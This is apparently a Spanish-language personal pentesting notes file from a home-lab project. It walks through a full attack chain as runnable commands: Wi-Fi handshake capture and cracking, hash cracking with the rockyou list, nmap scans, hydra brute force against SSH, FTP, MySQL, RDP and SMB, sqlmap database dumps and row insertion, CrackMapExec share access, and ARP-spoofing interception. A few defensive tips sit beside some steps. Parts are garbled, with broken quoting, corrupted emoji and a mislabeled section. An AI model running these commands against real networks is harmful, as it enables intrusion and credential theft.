#=========================================================================================================================
[â›©ï¸WHITE WHALE]::
# DocumentaciÃ³n Sherlock                    : https://www.kali.org/tools/sherlock/?
# DocumentaciÃ³n no-oficial ZPHISHER         : https://www.youtube.com/watch?v=IEymiOTavEE
# DocumentaciÃ³n no-oficial Jonh             : https://www.youtube.com/shorts/9a8LuYSHYe0
# DocumentaciÃ³n no-oficial aircrack         : https://www.aircrack-ng.org/
# DocumentaciÃ³n no-oficial nmap             : https://nmap.org/
# DocumentaciÃ³n no-oficial hydra            : https://github.com/vanhauser-thc/thc-hydra
# DocumentaciÃ³n no-oficial sqlmap           : https://sqlmap.org/
# DocumentaciÃ³n no-oficial sherlock         : https://github.com/sherlock-project/sherlock
# DocumentaciÃ³n no-oficial gobuster         : https://github.com/OJ/gobuster
# DocumentaciÃ³n no-oficial zphisher         : https://github.com/htr-tech/zphisher
# DocumentaciÃ³n no-oficial jonh             : https://www.openwall.com/john/
# DocumentaciÃ³n no-oficial burp             : https://portswigger.net/burp

#=========================================================================================================================
[â›©ï¸INSTALACIONES]::
# ğŸ•·ï¸ esta configuraciÃ³n la he realizado desde una "raspberry pi zero 2w" donde he instalado un Kali Linux
# ğŸ•·ï¸ de esta forma aislo una maquina de ataque del proyecto principal
# terminal
su
****
apt update && apt upgrade -y

# instalo bspwm (gestor de ventanas minimalista)
git clone https://github.com/ZLCube/AutoBspwm.git
cd AutoBspwm
chmod +x AutoInstall.sh
./AutoInstall.sh
1
****
# cuando aparezca la interface de "seleccionar una opciÃ³n"
> Pink Theme

# para seleccionar el tema intro para previsualizar y alt+a para seleccionar el tema

# reglas de utilizaciÃ³n::
windows + enter abre terminal 
windows + w cierra terminal
windows + d abre el buscador de aplicaciones
windows hold mover libremente la ventana
windows clic derecho reescalar libremente la ventana
windows + alt + flechas escalar ventana
windows + ctl + flechas mover ventana
control + shift + t abre pestaÃ±a en terminal
control shift alt t renombrar pestaÃ±a de terminal
control shift w cerrar pestaÃ±a de terminal
windows + "1,2,3,4,5,6,7,8,9,0" cambiar de escritorio
windows + shift + "1,2,3,4,5,6,7,8,9,0" cambiar de escritorio la ventana actual al escritorio seleccionado

# Los dot files los puedes modificar en las siguientes rutas.
~/.config/bspwm/bspwmrc
~/.config/polybar/
~/.config/picom/picom.conf
~/.config/sxhkd/sxhkdrc

# reinicio la mÃ¡quina
reboot

# instalaciones 
apt update
apt upgrade -y

# creo una carpeta en el contenedor e instalo el script
mkdir /KIRIBAKO && cd /KIRIBAKO
apt install vim -y
vim script-00.sh
# i - (shift + botÃ³n derecho):
--------------------------------------------------------------------------------------
    # cÃ³digo de /SCRIPTS/script-00.sh de este github
--------------------------------------------------------------------------------------

# doy permisos y hago la instalaciÃ³n
chmod +x script-00.sh
./script-00.sh
source ~/.bashrc

#=========================================================================================================================
[â›©ï¸PENTESTING]::
# ğŸ‘¨ğŸ‘‹ğŸ“ he realizado una investigaciÃ³n del funcionamiento de los promps que he ido utilizando, sobre mi investigaciÃ³n de vulnerabilidades y como podriÃ¡n ser los ataques
# ğŸ‘¨ğŸ‘‹ğŸ“ estos comandos son los que mÃ¡s interesantes me han parecido


# lo primero intentarÃ­a entrar a travÃ©s del wifi si no tengo una interface wifi lo hago con GNS3
# pero como quiero hacer pruebas a nivel interno me salto este paso
# intento entrar al wifi
## ğŸ“¶ Wifi
    # instalo aircrack-ng
    sudo apt-get install aircrack-ng -y
    
    # identificar wifi
    iwconfig
    
    # cambio el adaptador a modo monitor 
    sudo airmon-ng start <ADAPTADOR_WIFI>
    
    # escaneo redes (Wi-Fi disponibles, BSSID/MAC, canales...)
    sudo airodump-ng wlan0mon
    
    # capturo el Handshake
    sudo airodump-ng --bssid [BSSID] -c [CANAL] -w captura wlan0mon
    
    # una vez conseguido el archivo de captura, puedo desifrar la contraseÃ±a
    aircrack-ng -w [ruta/diccionario.txt] -b [BSSID] captura.cap
    2


# una vez consiga un hash, hago fuerza brueta para conseguirlo en texto plano a nivel local
## ğŸ© jonh
# instalo jonh
sudo apt install john -y

# agrego hash que me interesa a un txt
touch /KIRIBAKO/hashes.txt
echo "5f4dcc3b5aa765d61d8327deb882cf99" > /KIRIBAKO/hashes.txt
echo "5e884898da28047151d0e56f8dc6292773603d0d6aabbddc76098d0f8a5b0c00" >> /KIRIBAKO/hashes.txt
echo "5f4dcc3b5aa765d61d8327deb882cf99
echo "5f4dcc3b5aa765d61d8327deb882cf99" >> /KIRIBAKO/hashes.txt

# descargo el dicionario
apt install wget -y
cd /KIRIBAKO
wget rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# suponiendo que tengo un archivo hash.txt que contiene hashes de diferentes tipos
john --wordlist=/KIRIBAKO/rockyou.txt /KIRIBAKO/hashes.txt

# muestra las contraseÃ±as que John the Ripper ha descifrado exitosamente
john --show hashes.txt

# credenciales descubiertas
cat ~/.john/john.pot


# escaneo la red por vulnerabilidades, servicios, puertos y dispositivos
## ğŸ›œ nmap 
# instalo nmap
apt install sudo
apt install nmap

# escaneo de dispositivos
nmap -sP 192.168.1.0/24

# identificaciÃ³n de servicios
nmap -sV 192.168.1.1

# detectar dispositivos activos
# ğŸ•·ï¸ este comando me a servido para conseguir las ip para luego utilizar fuerza bruta
# ğŸ”¥ con un antivirus bueno deberÃ­a avisarnos del intento de escaneo del equipo
sudo nmap -sP 192.168.1.0/24

# escanear puertos de una ip
sudo nmap -sS -sV 192.168.1.100

# Escaneo de Vulnerabilidades
sudo nmap --script vuln 192.168.1.100


# una vez que conozco las ip, utilizo fuerza bruta para intentar entrar a los servicios
## ğŸ hydra
apt install hydra
# para ssh
# ğŸ•·ï¸ con este comando conseguirÃ¡ las password del login (como estoy utilizando un mini-pc de bajos recursos el tiempo estimado es de casi 2 aÃ±os...)
# ğŸ”¥ las medidas son utilizar fail2ban para proteger el login y utilizar contraseÃ±as robustas
hydra -t 4 -l root -P /KIRIBAKO/rockyou.txt ssh://192.168.1.86
hydra -l [usuario] -P [ruta/diccionario.txt] ssh://[IP o dominio]

# para ftp
hydra -l [usuario] -P [ruta/diccionario.txt] ftp://[IP o dominio]

# para http
hydra -l [usuario] -P [ruta/diccionario.txt] [IP o dominio] http-post-form "/ruta/login:username=^USER^&password=^PASS^:Fallo en la autenticaciÃ³n"

# para sql
hydra -l root -P [ruta/diccionario.txt] mysql://192.168.1.100

# para telnet 
hydra -l [usuario] -P [ruta/diccionario.txt] telnet://[IP o dominio]

# para rdp
hydra -l [usuario] -P [ruta/diccionario.txt] rdp://[IP o dominio]


# intento conseguir informaciÃ³n de la base de datos
## ğŸ’‰ sqlmap 
# instalo sqlmap
# git clone https://github.com/sqlmapproject/sqlmap.git
# cd sqlmap
apt install sqlmap

# ğŸ•·ï¸ nunca va encontrar el nombre de la base de datos ya que es una web falsa, pero el honeypot va a registrar cada peticiÃ³n que haga a la pÃ¡gina
# ğŸ”¥ la soluciÃ³n es utilizar las buenas prÃ¡cticas con (mysql_secure_installation) y monitorizar los registros de intrusiÃ³n
# ğŸ”¥ ademÃ¡s, mi script para controlar mi db me envÃ­a mensajes repetitivos por cada peticiÃ³n
sqlmap -u "http://192.168.1.86/?id=1" -dbs --level=5 --risk=3

# con la url volnerable (intentarÃ¡ enumerar las bases de datos)
python sqlmap.py -u "http://localhost/vulnerable.php?id=1" --dbs

# pruebo a vulnerar con hydra la base de datos : ğŸ 
hydra -l root -P /KIRIBAKO/rockyou.txt mysql://localhost

# si encuentro el nombre de la base de datos puedo enumerar sus tablas
sqlmap -u "http://example.com/vulnerable.php?id=1" -D nombre_base_datos --tables

# obtengo los datos de una tabla especifica de una base de datos
sqlmap -u "http://example.com/vulnerable.php?id=1" -D nombre_base_datos -T nombre_tabla --dump

# si llego hasta aquÃ­ con el paquete de Jonh puedo descifrar luego los hashes de usuarios de la base de datos, puedo entrar al registro web con permisos de administrador
# tambiÃ©m puedo intentar entrar a la base de datos y crear una nueva tupla
sqlmap -u "http://example.com/vulnerable.php?id=1" --sql-shell

# inserto una tupla acomodandola a esa db
INSERT INTO nombre_tabla (columna1, columna2) VALUES ('valor1', 'valor2');

  # otra forma de hacer lo anterior sin entrar por shell es mandar la consulta directamente
  sqlmap -u "http://example.com/vulnerable.php?id=1" --sql-query "INSERT INTO nombre_tabla (columna1, columna2) VALUES ('valor1', 'valor2');"


# Con los datos conseguidos utilizo sherlock para buscar mÃ¡s informaciÃ³n
## ğŸ” Sherlock
# instalaciÃ³n
sudo apt install git python3 python3-pip

# repositorio
cd /KIRIBAKO
git clone https://github.com/sherlock-project/sherlock.git
cd sherlock

## creo un entorno virtual 
    apt install python3-venv      # instala virtualenv
    python3 -m venv venv          # crea un entorno virtual dentro del directorio donde estÃ¡ el proyecto
    source venv/bin/activate      # Activa el entorno virtual    
    pip install -e .              # Esto instalarÃ­a las dependencias especificadas en el proyecto si es compatible con pip

# analizo datos de correos de la base de datos
# ğŸ•·ï¸ con sherlock no solo puedes ver las paginas donde has sido registrado si no si tu correo a sido vulnerado en servicios de recopilaciÃ³n
# ğŸ”¥ usar servicios de email temporales para registro de plataformas o accesos exteriores como la que ofrece duckduckgo o protonmail
python3 -m sherlock_project <USUARIO_O_CORREO>

# salgo del entorno virtual 
> deactivate


# ğŸŒ whatweb
# para conocer las tecnologÃ­as de una web
apt install whatweb
whatweb http://192.168.1.86/


# ğŸ¥¶ sublist3r 
# para automatizar ataques en entornos Windows
# instalaciÃ³n
cd /KIRIBAKO
git clone https://github.com/Porchetta-Industries/CrackMapExec
cd CrackMapExec

## creo un entorno virtual 
    python3 -m venv venv
    source venv/bin/activate
    python setup.py install
    pip install .
    crackmapexec --help

# ataco por fuerza bruta el protocolo smb
# ğŸ : hydra -l <USER> -P /KIRIBAKO/rockyou.txt smb://<TARGET_IP>
# ğŸ•·ï¸ login exitoso en mi pc personal
# ğŸ”¥ deshabilitar SMBv1
crackmapexec smb <IP_PC_PERSONAL>/24 -u <USER> -p <PASSWORD>    
crackmapexec smb <IP_PC_PERSONAL>/24 -u <USER> -p <PASSWORD> --shares        # para comprobar los shares
smbclient //<IP_PC_PERSONAL>/Users -U <USER>                                    # en caso de poder acceder a /Users puedo entrar hasta la cocina de mi pc personal por smb:\> |

# salgo del entorno virtual 
> deactivate


# Con los datos recogidos de usuarios donde obtengo los correos realizo un phising
## ğŸ“§ Zphiser
# instalaciÃ³n
...


## ğŸ¦ˆ tshark
# instalaciÃ³n
sudo apt install tshark

# para listar las interfaces
tshark -D

# ğŸ•·ï¸ ataque man-in-the-middle: robo de datos, contraseÃ±as... 
# ğŸ”¥ monitorizar quien estÃ¡ escuchando paquetes (arp -a)
# captura paquetes de una red
sudo tshark -i eth0 -V

# filtrar paquetes entre un equipo y el router
sudo tshark -i eth0 -f "host <IP_DESTINO> or host <IP_ROUTER>"

# ejecuto wireshark 
tshark






# Voy a utilizar arpspoof (o ettercap) para enviar paquetes ARP falsificados y caputrar el trÃ¡fico
## ğŸ¦ˆ Arpspoof && Wireshark
# instalaciÃ³n 
arpspoof -i [INTERFAZ] -t [IP_VICTIMA] [IP_ROUTER]

# ver analisis 
arp

# ver trÃ¡fico http
http

# ver trÃ¡fico de vÃ­ctima
ip.addr == 192.168.1.10

# ver trÃ¡fico entre vÃ­ctima y router 
(ip.src == 192.168.1.10 && ip.dst == 192.168.1.1) || (ip.src == 192.168.1.1 && ip.dst == 192.168.1.10)















--































































# escaneo mi ususario en internet
apt install sherlock
sherlock <nombre o email>





# para encontrar la ip del router
# sudo apt install nmap net-tools curl wget aircrack-ng git -y
# apt install python3 python3-pip python3-venv -y

ip route









#===========================================================================================================================
[â›©ï¸INSTALACIÃ“N ETHERNET]:

#===========================================================================================================================
[â›©ï¸INSTALACIONES]:
# Instalar paquetes de pentesting
apt install -y nmap metasploit-framework wireshark


============================================================

Nmap: Para escaneo de redes y puertos.
Metasploit: Para explotaciÃ³n de vulnerabilidades

# [ğŸ›¡ï¸Hack de red domestica]:
#    1Âº Esnifo la red                                             ğŸ“Œ nmap, Wireshark, Bettercap, Netcat 
#    2Âº Ataque de la red wifi                                     ğŸ“Œ Aircrack-ng, Reaver, Kismet
#    3Âº Accedo al router y consigo el user/password               ğŸ“Œ RouterSploit, Hydra, Medusa, Metasploit (msfconsole)
#    4Âº Entro en el router 
#    5Âº Consigo acceder algÃºn dispositivo del router              ğŸ“Œ Nmap + NSE Scripts, Shodan
#    6Âº OPCIONAL: Creo un punto Wifi-falso (Evil Twin Attack)     ğŸ“Œ Setoolkit   
#    
# 
# [ğŸ›¡ï¸Hack de web para el trabajo anterior (lebantado en una mÃ¡quina)]:
#    1Âº Comprobar la inyecciÃ³n SQL                                ğŸ“Œ sqli, SQLMap, 
#    2Âº Localizar pÃ¡ginas y solicitudes HTTP                      ğŸ“Œ Burp Suite, Wfuzz, OWASP ZAP (Zed Attack Proxy)
#    3Âº LocalizaciÃ³n de login y fuerza bruta                      ğŸ“Œ Nikto, 


============================================================

[ ğŸ›¡ï¸ H A C K D E B A J O N I V E L ]:
1. Paquetes de Red y Herramientas de AnÃ¡lisis
  libpcap: Una biblioteca que permite la captura de paquetes en redes. Es utilizada por muchas herramientas de anÃ¡lisis de red, como Wireshark y tcpdump.
  tcpdump: Una herramienta de lÃ­nea de comandos para capturar y analizar paquetes de red. Permite ver el trÃ¡fico en tiempo real y guardar capturas para anÃ¡lisis posterior.
  Wireshark: Una herramienta grÃ¡fica de anÃ¡lisis de protocolos de red que permite capturar y examinar el trÃ¡fico de red en detalle.
  Scapy: Una poderosa herramienta de manipulaciÃ³n de paquetes en Python que permite crear, enviar y recibir paquetes de red. Es Ãºtil para pruebas de penetraciÃ³n y anÃ¡lisis de protocolos.

2. Herramientas de Escaneo y EnumeraciÃ³n
  Nmap: Una herramienta de escaneo de red que permite descubrir hosts y servicios en una red, asÃ­ como identificar sistemas operativos y versiones de software.
  Netcat (nc): Una herramienta versÃ¡til que puede ser utilizada para leer y escribir datos a travÃ©s de conexiones de red utilizando TCP o UDP. Es Ãºtil para pruebas de conectividad y transferencia de archivos.
  Masscan: Un escÃ¡ner de puertos extremadamente rÃ¡pido que puede escanear grandes rangos de direcciones IP en poco tiempo.

3. ExplotaciÃ³n y Ataques
  Metasploit Framework: Un marco de explotaciÃ³n que incluye una amplia gama de herramientas y mÃ³dulos para explotar vulnerabilidades en sistemas y aplicaciones.
  Aircrack-ng: Un conjunto de herramientas para auditar redes Wi-Fi, que incluye capacidades para capturar paquetes, crackear contraseÃ±as y realizar ataques de inyecciÃ³n.
  Ettercap: Una herramienta para realizar ataques de "man-in-the-middle" en redes, que permite interceptar y modificar el trÃ¡fico entre dos hosts.

4. Herramientas de Fuerza Bruta y Cracking
  Hydra: Una herramienta de fuerza bruta que soporta mÃºltiples protocolos y puede ser utilizada para intentar acceder a cuentas de usuario.
  John the Ripper: Un potente cracker de contraseÃ±as que puede utilizarse para descifrar contraseÃ±as a partir de hashes.
  Hashcat: Un cracker de contraseÃ±as que utiliza la GPU para acelerar el proceso de descifrado de contraseÃ±as.

5. AnÃ¡lisis de Vulnerabilidades
  Nessus: Un escÃ¡ner de vulnerabilidades que identifica configuraciones inseguras y vulnerabilidades en sistemas y aplicaciones.
  OpenVAS: Un escÃ¡ner de vulnerabilidades de cÃ³digo abierto que proporciona anÃ¡lisis de seguridad en redes y sistemas.

6. ManipulaciÃ³n de Protocolos
  hping: Una herramienta de lÃ­nea de comandos que permite enviar paquetes TCP/IP personalizados y realizar pruebas de red.
  Netwox: Un conjunto de herramientas de red que permite realizar diversas tareas, como escaneo, sniffing y manipulaciÃ³n de paquetes.

7. Sistemas Operativos y Entornos de Hacking
  Kali Linux: Una distribuciÃ³n de Linux diseÃ±ada especÃ­ficamente para pruebas de penetraciÃ³n y seguridad informÃ¡tica, que incluye muchas de las herramientas mencionadas anteriormente.
  Parrot Security OS: Otra distribuciÃ³n de Linux orientada a la seguridad que incluye herramientas para pruebas de penetraciÃ³n y anÃ¡lisis forense.

[ ğŸ›¡ï¸ O T R O S M Ã S D E F I N I D O S ]:
1. Herramientas de AnÃ¡lisis Forense
  Autopsy: Una herramienta de anÃ¡lisis forense digital que permite examinar discos duros y dispositivos de almacenamiento.
  Sleuth Kit: Un conjunto de herramientas para realizar anÃ¡lisis forense en sistemas de archivos.

2. Herramientas de Seguridad Web
  Burp Suite: Aunque ya se mencionÃ³, es importante destacar que es una de las herramientas mÃ¡s completas para pruebas de seguridad en aplicaciones web.
  OWASP ZAP: Otra herramienta popular para pruebas de seguridad en aplicaciones web, especialmente para detectar vulnerabilidades comunes.

3. Herramientas de Escaneo de Redes
  Angry IP Scanner: Una herramienta de escaneo de redes que permite descubrir dispositivos en una red local.
  Fing: Una aplicaciÃ³n para escanear redes y descubrir dispositivos conectados.

4. Herramientas de Cracking de ContraseÃ±as
  Cain and Abel: Una herramienta para recuperar contraseÃ±as de Windows que incluye capacidades de sniffing y cracking.
  L0phtCrack: Una herramienta para auditar contraseÃ±as de Windows.

5. Herramientas de IngenierÃ­a Social
  Social-Engineer Toolkit (SET): Una herramienta diseÃ±ada para realizar ataques de ingenierÃ­a social, como phishing y ataques de suplantaciÃ³n.

6. Herramientas de AutomatizaciÃ³n
  Puppet/Chef/Ansible: Aunque son herramientas de gestiÃ³n de configuraciÃ³n, pueden ser utilizadas para automatizar la configuraciÃ³n de entornos de pruebas de penetraciÃ³n.

7. Herramientas de Seguridad de IoT
  IoT Inspector: Una herramienta para analizar la seguridad de dispositivos IoT y sus comunicaciones.

8. Herramientas de AnÃ¡lisis de Malware
  Cuckoo Sandbox: Una herramienta de anÃ¡lisis de malware que permite ejecutar y analizar archivos sospechosos en un entorno controlado.

9. Frameworks de Pruebas de PenetraciÃ³n
  Pwnage: Un marco de pruebas de penetraciÃ³n que incluye herramientas para realizar diversas pruebas de seguridad.

10. Herramientas de Sniffing y Spoofing
  dsniff: Un conjunto de herramientas para realizar ataques de sniffing y spoofing en redes.
  Bettercap: Una herramienta de ataque de red que permite realizar ataques de "man-in-the-middle" y sniffing.













----------------------------------------












Herramientas a instalar
Nmap: Herramienta de escaneo de redes.
bash
-
sudo apt update
sudo apt install nmap
Metasploit Framework: Plataforma para desarrollar y ejecutar exploits.
-

-
sudo apt install metasploit-framework
Wireshark: Herramienta de anÃ¡lisis de trÃ¡fico de red (puedes usar tshark en terminal).
-

-
sudo apt install tshark
Burp Suite: Herramienta para pruebas de seguridad en aplicaciones web (puedes usar la versiÃ³n comunitaria).
-

-
sudo apt install burpsuite
Nikto: EscÃ¡ner de vulnerabilidades para servidores web.
-

-
sudo apt install nikto
John the Ripper: Herramienta para romper contraseÃ±as.
-

-
sudo apt install john
Aircrack-ng: Suite de herramientas para auditorÃ­a de redes Wi-Fi.
-

-
sudo apt install aircrack-ng
Gobuster: Herramienta para enumerar directorios y archivos en servidores web.
-

-
sudo apt install gobuster
Hydra: Herramienta para ataques de fuerza bruta.
-

-
sudo apt install hydra
CÃ³mo utilizarlas
Nmap: Puedes usar Nmap para escanear redes y descubrir hosts activos.
-

-
nmap -sP 192.168.1.0/24
Metasploit: Inicia Metasploit y busca exploits para vulnerabilidades especÃ­ficas.
-

-
msfconsole
Tshark: Captura trÃ¡fico de red en tiempo real.
-

-
sudo tshark -i eth0
Nikto: Escanea un servidor web en busca de vulnerabilidades.
-

-
nikto -h http://example.com
John the Ripper: Usa John para intentar romper un archivo de contraseÃ±as.
-

-
john --wordlist=/path/to/wordlist.txt /path/to/passwordfile
Aircrack-ng: Captura paquetes y crackea contraseÃ±as de redes Wi-Fi.
-

-
airodump-ng wlan0
Gobuster: Busca directorios y archivos ocultos en un servidor web.
-

-
gobuster dir -u http://example.com -w /path/to/wordlist.txt
Hydra: Realiza un ataque de fuerza bruta a un servicio.
-

-
hydra -l admin -P /path/to/passwordlist.txt ftp://example.com
Consideraciones
Permisos: AsegÃºrate de tener permiso para realizar pruebas de penetraciÃ³n en las redes y sistemas que escaneas.
Actualizaciones: MantÃ©n tu sistema y herramientas actualizadas.
DocumentaciÃ³n: FamiliarÃ­zate con la documentaciÃ³n de cada herramienta para aprovechar al mÃ¡ximo sus capacidades.
